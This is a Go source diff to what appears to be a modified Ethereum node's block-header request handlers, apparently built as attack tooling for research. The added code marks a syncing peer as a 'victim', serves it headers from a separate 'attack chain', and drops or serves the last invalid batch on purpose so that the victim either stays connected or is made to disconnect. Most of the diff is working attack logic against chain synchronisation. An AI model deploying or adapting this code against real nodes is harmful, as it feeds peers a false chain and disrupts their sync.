@@ -61,6 +61,40 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 	chain := backend.Chain()
 	if bridge.MustUseAttackChain() {
 		chain = attackChain
+		log.Info("Using attack chain to fulfil it")
+	} else {
+		log.Info("Using honest chain to fulfil it")
+	}
+
+	q := query.GetBlockHeadersPacket
+	/*
+	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false &&
+	   bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
+	   bridge.LastPartialBatch(q.Origin.Number) {	// If it is the last, partial batch, we can't provide it
+													// or we'll be immediately disconnected. So we drop the request.
+		return nil
+
+
+	}
+	*/
+	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
+	   	if bridge.LastInvalidBatch(q.Origin.Number) {
+	   		if !bridge.MustDisconnectVictim() {
+	   															// If we must not disconnect the victim,
+	   															// we don't provide the invalid batch which
+	   															// would cause the disconnection
+	   			log.Info("Request for invalid batch", "status", "dropped")
+	   			return nil
+	   		} else {
+	   			log.Info("Request for invalid batch", "status", "serving")
+	   		}
+	   		bridge.TerminatingSyncOp()
+	   	}
+
+	   	if !bridge.BatchExists(q.Origin.Number) {
+	   		return nil						// If we get a query for a batch we don't have, we just drop it.
+	   										// Very soon the syncOp will be stopped and a new one started anyway.
+	   	}
 	}
 
 	response := ServiceGetBlockHeadersQuery(chain, query.GetBlockHeadersPacket, peer)
@@ -84,14 +118,18 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	maxNonCanonical := uint64(100)
 
 	if hashMode && query.Origin.Hash == bridge.Latest().Hash() && query.Amount == 2 && query.Skip == 63 && query.Reverse {
-		bridge.SetMasterPeer()
+		//bridge.SetMasterPeer()
 		bridge.SetVictimIfNone(peer.Peer)
+		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
+			bridge.SetMasterPeer()
+		}
 
 		//head, pivot := bridge.GetHigherHeadAndPivot()
 
 		if bridge.MustUseAttackChain() {
 			chain = attackChain 			// As we changed the bridge state (setting a victim), re-check whether
 											// we need to use attack chain
+			log.Info("Switched to attack chain because victim is now set")
 		}
 	} else {
 		log.Info("bridge provided latest", "hash", bridge.Latest().Hash())
